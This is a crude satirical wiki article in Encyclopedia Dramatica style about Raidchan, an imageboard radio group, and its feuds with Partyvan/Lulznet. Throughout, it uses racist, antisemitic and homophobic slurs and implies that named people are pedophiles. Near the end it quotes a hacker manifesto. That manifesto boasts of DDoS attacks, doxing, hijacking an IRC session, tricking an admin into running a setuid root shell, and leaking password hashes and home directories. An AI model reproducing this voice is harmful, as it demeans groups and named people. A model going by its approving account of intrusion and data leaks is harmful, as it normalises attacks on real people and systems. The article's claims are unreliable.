Raidchan
[[Image:lolwutraidchan.png|thumb|250px|]]

[http://raidchan.org '''Raidchan'''] is one of the few [[chan]]s with no images boards. Lead by [[skiddies]] it has dedicated itself to funding, running and maintaining a [[radio]] station. Home of such [[sarcasm|internet sensations]] as AnounymOS, and Kamizar (who?) Raidchan Radio runs 24/7 with anon djs constantly broadcasting [[shit nobody cares about|shit that no one listens to]] across tainted [[tubes]] stained by said [[shit]]. 

Raidchan is currently <s>raiding</s> trolling [[/b/]]

==Raidchan Radio==
Raidchan radio is 24/7 online radio station [[CP|made with anonymous' tastes in mind]].  The site is continually updated whenever the DJs feel like it. There is no actual image board but you can join the [irc://irc.raidchan.org/radio IRC channel] whenever you feel like it. Be prepared for great [[lulz]] and [[drama]] when joining.  With music ranging from classic tunes, to obscure metal, to retarded video game remixes, to musical memes, Raidchan is broadcasting 24 hours a day across the internet with [[lie|Live DJs]] offering views, thoughts and reports on current events and anything else, including information on any noteworthy [[raids]] or shit to be careful of.  Raidchan has supposedly survived hacking attempts, DDoS, [[fail|fucked up Paypal accounts]], financial lock down, and retarded owners to broadcast the music you (don't) hear today.

==Raidchan Antics==
[[Image:Koraxyou.JPG|thumb|right|225px|[[Typical]] Raidchan Raid.]]
[[Image:2luf37r.png|thumb|Bangers and Mash!]]

Raidchan is know for <s>raiding</s> trolling [[B|/b/]] and [[stickam]]. It's become a major source of [[the cancer that is killing /b/]] with its "[[Korax]]> YOU" spam on [[Korax|The day /b/ died]]. One of the most remembered, quoted and unfunny [[faggotry|wacky antics]] on raidchan is [[Win|Bangers and Mash]]. When some dumbass edited the article on the delicious sausage meal to an 80s Police Drama staring Terry Korax as Detective Bangers and Sheldon Kamizar as Detective Mash. The article stayed up for about [[Last Thursday|two and a half weeks.]] Not funny.

===Trapdoor===
Trapdoor is the leader of the [[Pedophiles|people]] of raidchan, he is a [[Homosexual|Norwegian]] [[Prostitute|oilrig]] ([[Lies|I kid you not]]). On the few occasions where Trapdoor is not browsing for [[CP]] he spends his time ruining the life of [[/b/tards]] together with his trusted Jew Luk0r flooding [[Niggertits]] with anti-[[Lulznet|Homovan]] propaganda and "KORAX > YOU" spam. [[Some argue]] that he also did the [[Caturday Nap]].

===AnounymOS===
[[Paul Fetch|AnounymOS]] is perhaps the only one from raidchan that the [[btards|general population of the internet]] doesn't hate instinctively because of his [[Paul Fetch]] song [http://www.youtube.com/watch?v=eGAQpXMdFko]. However, that does not stop him from being a pretentious faggot just like everyone else.



===Homovan/Lulznet===
Raidchan used to be a part of the [[lulznet|homovan/lulznet]] irc network until it was revealed that Trapdoor was in fact a [[lulznet|flaming homosexual]] and raidchan was kicked out along with his trusted band of [[furries]], [[Jews]] and [[niggers]].
Raidchan floods on /b/ also caused an official change of name for the Homovan (more like homovan) network into Homovan. This action was also supported by the 4chan mods, who created a word filter to help the [[lulznet|homovan (more like homovan)]] [[furries|people]] ease in to the transition.

===SERVER UP :D:D:D===


As said before in this article, in a unfunny not satirical way, Raidchan was rooted [[last thursday|sometime]] last week, [[Drama|DRAMA]] happened ON THE INTERNET,
this totally [[sarcasm|unheard]] of turn of events sent the Raidchan staff reeling, total confusion reigned for about 25 minutes, at which point they realized that unlike the devilish hacker swines that had destroyed one of their precious servers, they had jobs, and enough [[unlimited disposable income|spare cash]] to purchase a [[Africa|small island.]] So without further pain, they cut the old nullrooted server away, like a cancer infected limb, and purchased a new sparkling  ULTRASERVER! 

Raidchan is back, flailing in the sea of fail like never before!

==And then.....==
* {{rainbow|<nowiki>LOLUMAD?</nowiki>}}

After waking up and finding the remnants of a hastily <s>rooted</s> deleted webserver, Raidchan members celebrated the loss over vodka and frosted flakes.  (This really happened).  Unphased, Raidfags immediately retaliated with more ddos, until all four kilobytes of the website could be restored.

Never one to be out performed by Englishmen or Jews, lulznet immediately coordinated a <s>massive counter-attack</s> internet radio show, in which the objective was to release dox on as many Raidchan and NetCollect members as possible.  To further the damage, live calls were made to members on the list.  Many of these failed prank calls were attempted to the regulars of both Raidchan and Netcollect, however, it was soon discovered that the docs were invalid and the radio show ended abruptly after the aids and fail became too overwhelming to endure.  Not one to let sleeping dogs lie, Raidchan once again responded with a DDoS to ustream which subsequently ended the streams of Partyvan (and every other ustream user).  "This is why we can't have nice things" shouted camwhores everywhere.

After hearing the radio show and learning of the proliferation of 'dd0x08' an [[Drunk|infuriated]] Raidchan retaliated yet again by <s>rooting</s> humiliating Partyvan and rm -rf'ing their box.  Andy began crying and exacted [[Quitting_IRC_forever|a terrible revenge]].  Still unsatisfied, Raidchan/NetCollect publicized the entire debacle in the following:

<pre>
:=======================================:

:           who will win?               |	
:                                       |
:      obviously the cooler ones        |
: ^ AND MORE TALENTED AT THAT LOL WTF ^ |
:        lol "partyvanpranks" lol       |
:---------------------------------------|
: Fuck you andy, core, hassen, all of   |
: you homovan faggots. This is what you |
: get. Start a war; we finish the war.  |
:_______________________________________|

NC: So like, NetCollect. We got kicked off of Partyvan's IRC network for abuse. 
LOL, isn't that fucking ironic? They are such ("self-proclaimed") user whores, 
that they get so butt hurt and won't stop bawwwing because another network that 
was linked with us made "#london" [a series of random ass flooding etc] leave 
the network. So, they decided to attempt to dox one of the NC admins and kick them 
off the network. Of course, they had the wrong dox on our beloved pacifico.
They decided to drop these again the other day for no reason. Hence, THIS.
People who helped in this wonderful achievement from here: pacifico

RaidChan: So, one of the founders of RaidChan founded PartyVan, a bunch of bullshit 
drama that no one cares about happened, then recently (Read: the other day) they started 
messing with them and their links [NC, Dirt, etc] for absolutely no reason. So, like good 
Botfags, they did DDoS'd everything that belonged to partyvan, and even ustream when they 
tried to get up. They took it another step further when they started talking about normal 
people. 
People who helped in this wonderful achievement from here: Luk0r, Trapdoor
People from both: viraL

So, anyway.

--> step 1
One of our dedicated hoes decided to get on HomoVan IRC for some reason and was under the nick
"Ryan". Trencher PM'd the person and for whatever reason in his retarded fucking head he thought 
he was the skiddie by the nick of "xl[o|0]" <- that was an OR statement for you fuck heads.

So we got his shell, got in, attempted to root with our elite hax0r 0days, but, since most of us
have been gone for quite some time, we _failed_. Yep, we admit it. So, we stepped to S/E.

--> step 2
Basically, we DDoS'd trencher so he couldn't notice, got in his irssi session with some 1337 snooping shit, 
and tricked andy into running a program that setuid(0) a bash shell for us in /tmp. 

Wow, nice job guys!
Anyway, some "useful" shit that they had on file, like, uh, the .info wiki DB dump, password hashes, some stolen 
rfi's, all of the /home/ directories can be found in both tarball and public access format here:
